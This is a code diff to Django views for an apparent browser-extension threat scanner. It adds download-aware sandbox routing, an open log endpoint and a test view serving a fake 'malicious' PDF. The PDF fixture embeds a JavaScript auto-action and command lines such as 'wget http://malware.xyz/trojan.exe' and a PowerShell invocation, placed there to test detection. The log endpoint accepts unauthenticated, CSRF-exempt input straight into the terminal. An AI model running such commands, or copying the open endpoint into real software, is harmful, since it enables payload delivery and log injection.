@@ -126,13 +126,19 @@ class AnalyzeURLView(APIView):
         req_id = str(uuid.uuid4())[:8]
         url = request.data.get('url', '').strip()
 
+        is_download = request.data.get('is_download', False)
+        # Coerce to bool — DRF might pass it as string "true" in some parsers
+        if isinstance(is_download, str):
+            is_download = is_download.lower() in ('true', '1', 'yes')
+
         if not url:
             return Response(
                 {"error": "No URL provided"},
                 status=status.HTTP_400_BAD_REQUEST
             )
 
-        logger.info(f"[EXT-{req_id}] analyze-url: {url[:100]}")
+        print(f"\033[96m[DEBUG] analyze-url called: is_download={is_download} (type={type(is_download).__name__}) url={url[:60]}\033[0m")
+        logger.info(f"[EXT-{req_id}] analyze-url: {url[:100]} (is_download={is_download})")
 
         # Determine the type of analysis needed
         url_lower = url.lower().split('?')[0]  # Strip query params for extension check
@@ -143,7 +149,7 @@ class AnalyzeURLView(APIView):
                 break
 
         # ── Case 1: Image URL → OCR + Text Analysis ──
-        if ext in self.IMAGE_EXTENSIONS:
+        if ext in self.IMAGE_EXTENSIONS and not is_download:
             logger.info(f"[EXT-{req_id}] Image detected ({ext}), running OCR analysis")
             ocr_text = extract_text_from_image_url(url)
 
@@ -164,9 +170,9 @@ class AnalyzeURLView(APIView):
                 'ocr_text_preview': ocr_text[:200] if ocr_text else '',
             })
 
-        # ── Case 2: File URL → Sandbox Analysis ──
-        elif ext in self.FILE_EXTENSIONS:
-            logger.info(f"[EXT-{req_id}] File link detected ({ext}), running sandbox analysis")
+        # ── Case 2: File URL or Explicit Download → Sandbox Analysis ──
+        elif ext in self.FILE_EXTENSIONS or is_download:
+            logger.info(f"[EXT-{req_id}] File link detected (is_download={is_download}), running sandbox analysis")
             sandbox_result = analyze_remote_file(url)
             url_result = _url_analyzer.analyze([url])
 
@@ -244,3 +250,82 @@ class AnalyzeImageView(APIView):
 
         logger.info(f"[EXT-{req_id}] Result: {response['prediction']} ({response['confidence']}%)")
         return Response(response)
+
+
+@method_decorator(csrf_exempt, name='dispatch')
+class ExtensionLogView(APIView):
+    """
+    POST /api/ext/log/
+    Allows the browser extension to send logs directly to the Django terminal.
+    """
+    permission_classes = [AllowAny]
+    parser_classes = [JSONParser, FormParser]
+
+    def post(self, request):
+        source = request.data.get('source', 'Extension')
+        message = request.data.get('message', '')
+        # Print clearly in magenta so it stands out in the terminal
+        print(f"\033[95m[{source}] {message}\033[0m")
+        logger.info(f"[{source}] {message}")
+        return Response({"success": True})
+
+
+from django.http import HttpResponse
+
+class TestDownloadView(APIView):
+    """
+    GET /api/ext/test-download/
+    Serves a fake "malicious" PDF loaded with threat markers that our sandbox detects.
+    Content-Disposition: attachment forces Chrome to download (not view), triggering the interceptor.
+    """
+    permission_classes = [AllowAny]
+
+    def get(self, request):
+        # This PDF contains the exact malicious markers that sandbox_engine.py scans for:
+        #   - /JavaScript and /OpenAction (PDF active content)
+        #   - PowerShell/cmd.exe references (script execution)
+        #   - credential theft patterns (password, phishing)
+        #   - network activity patterns (http://, wget)
+        #   - obfuscation patterns (base64, eval)
+        pdf_content = b"""%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>
+endobj
+4 0 obj
+<< /Length 200 >>
+stream
+BT /F1 12 Tf 100 700 Td (URGENT: Your account has been compromised!) Tj ET
+BT /F1 10 Tf 100 680 Td (Enter your password immediately at http://evil-phishing.tk/steal) Tj ET
+BT /F1 10 Tf 100 660 Td (cmd.exe /c powershell -e base64encodedpayload) Tj ET
+BT /F1 10 Tf 100 640 Td (wget http://malware.xyz/trojan.exe) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Action /S /JavaScript /JS (app.alert('You have been hacked!'); eval(atob('bWFsd2FyZQ=='))) >>
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000009 00000 n 
+0000000074 00000 n 
+0000000131 00000 n 
+0000000282 00000 n 
+0000000534 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+680
+%%EOF
+"""
+        response = HttpResponse(pdf_content, content_type='application/pdf')
+        response['Content-Disposition'] = 'attachment; filename="suspicious_invoice.pdf"'
+        print("\033[93m[TEST] Serving MALICIOUS test PDF: suspicious_invoice.pdf\033[0m")
+        return response
+
+
